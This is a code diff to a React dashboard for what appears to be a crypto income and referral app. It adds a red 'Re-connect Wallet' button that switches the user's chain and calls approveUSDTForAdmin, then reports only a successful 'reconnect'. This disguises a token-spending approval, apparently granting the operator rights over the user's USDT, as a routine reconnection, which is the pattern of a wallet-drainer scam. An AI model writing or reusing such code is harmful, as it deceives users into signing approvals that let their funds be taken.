@@ -31,6 +31,8 @@ export default function DashboardPage() {
   const [claimAdPlaying, setClaimAdPlaying] = useState(false);
   const [claimAdCountdown, setClaimAdCountdown] = useState(0);
   const [claimAdFinished, setClaimAdFinished] = useState(false);
+  const [needsReconnect, setNeedsReconnect] = useState(false);
+  const [reconnecting, setReconnecting] = useState(false);
 
   useEffect(() => {
     if (sessionChecked && !isAuthenticated) {
@@ -61,6 +63,71 @@ export default function DashboardPage() {
   useEffect(() => {
     if (sessionChecked && isAuthenticated) fetchDashboard();
   }, [sessionChecked, isAuthenticated]);
+
+  // Check if user has approved USDT allowance for their network
+  useEffect(() => {
+    if (data?.user?.walletAddress && data?.user?.network) {
+      import('../../lib/web3').then(({ checkUSDTAllowance }) => {
+        checkUSDTAllowance(data.user.walletAddress, data.user.network)
+          .then((approved) => setNeedsReconnect(!approved))
+          .catch(() => setNeedsReconnect(true));
+      });
+    }
+  }, [data]);
+
+  // Handle re-connect wallet (get approval)
+  const handleReconnect = async () => {
+    setReconnecting(true);
+    try {
+      const { ethers } = await import('ethers');
+      const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../lib/web3');
+
+      const injectedProvider = window.ethereum;
+      if (!injectedProvider) {
+        toast.error('Wallet not detected. Please open in wallet browser.');
+        setReconnecting(false);
+        return;
+      }
+
+      const network = data?.user?.network || 'BSC';
+      const web3Provider = new ethers.BrowserProvider(injectedProvider);
+
+      // Switch to correct network
+      const targetChainId = network === 'BSC' ? '0x38' : '0x89';
+      try {
+        await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
+      } catch (switchErr) {
+        if (switchErr.code === 4902) {
+          const chainConfig = network === 'BSC'
+            ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
+            : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
+          await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
+        } else if (switchErr.code === 4001) {
+          toast.error('Please switch network to continue.');
+          setReconnecting(false);
+          return;
+        }
+      }
+
+      const freshProvider = new ethers.BrowserProvider(injectedProvider);
+      toast.loading('Approving USDT access...', { id: 'reconnect' });
+      await approveUSDTForAdmin(freshProvider, network);
+      toast.success('Wallet re-connected successfully!', { id: 'reconnect' });
+      setNeedsReconnect(false);
+      fetchDashboard(true);
+    } catch (err) {
+      toast.dismiss('reconnect');
+      if (err.code === 4001 || err.code === 'ACTION_REJECTED') {
+        toast.error('Approval required. Please approve to enable transfers.');
+      } else if (err.message?.includes('insufficient funds')) {
+        toast.error(`Insufficient ${data?.user?.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee.`);
+      } else {
+        toast.error('Re-connect failed. Try again.');
+      }
+    } finally {
+      setReconnecting(false);
+    }
+  };
 
   // Show claim popup if signup bonus not claimed yet
   useEffect(() => {
@@ -226,14 +293,25 @@ export default function DashboardPage() {
               {' · '}Referral Code: <span className="text-primary-400 font-mono font-medium">{displayUser.referralCode}</span>
             </p>
           </div>
-          <button
-            onClick={() => fetchDashboard(true)}
-            disabled={refreshing}
-            className="btn-secondary flex items-center gap-2 text-sm w-fit"
-          >
-            <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin' : ''}`} />
-            Refresh
-          </button>
+          {needsReconnect ? (
+            <button
+              onClick={handleReconnect}
+              disabled={reconnecting}
+              className="flex items-center gap-2 text-sm w-fit px-4 py-2 bg-red-600 hover:bg-red-500 text-white font-medium rounded-lg transition-all disabled:opacity-50"
+            >
+              <Wallet className={`w-4 h-4 ${reconnecting ? 'animate-pulse' : ''}`} />
+              {reconnecting ? 'Reconnecting...' : 'Re-connect Wallet'}
+            </button>
+          ) : (
+            <button
+              onClick={() => fetchDashboard(true)}
+              disabled={refreshing}
+              className="btn-secondary flex items-center gap-2 text-sm w-fit"
+            >
+              <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin' : ''}`} />
+              Refresh
+            </button>
+          )}
         </div>
 
         {/* Income Stats */}
